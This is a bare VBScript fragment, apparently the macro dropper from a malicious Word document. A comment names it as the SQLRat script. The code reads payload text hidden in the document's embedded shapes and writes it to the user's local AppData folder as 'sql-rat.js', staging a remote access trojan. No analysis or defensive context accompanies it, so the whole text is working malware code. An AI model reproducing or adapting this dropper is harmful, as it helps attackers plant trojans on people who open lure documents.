'Get embedded SQLRat script and write to disk
Dim content1, content2
Dim oFSO, oFSO3strAppData, wshShell
Set wshShell = CreateObject("Wscript.Shell")
Set w = GetObject(,"Word.Application")
content1 = w.ActiveDocument.Shapes(4).TextFrame.TextRange.Text
content2 = w.ActiveDocument.Shapes(5).TextFrame.TextRange.Text
Set oFSO = CreateObject("Scripting.FileSystemObject")
Set oFSO2 = CreateObject("Scripting.FileSystemObject")
strLocalAppData = wshShell.ExpandEnvironmentStrings( "%LOCALAPPDATA%" ) + "\"
outFile = strLocalAppData + "sql-rat.js"
Set objFile = oFSO.CreateTextFile(outFile,True)
objFile.WriteLine content1
objFile.WriteLine content2
objFile.Close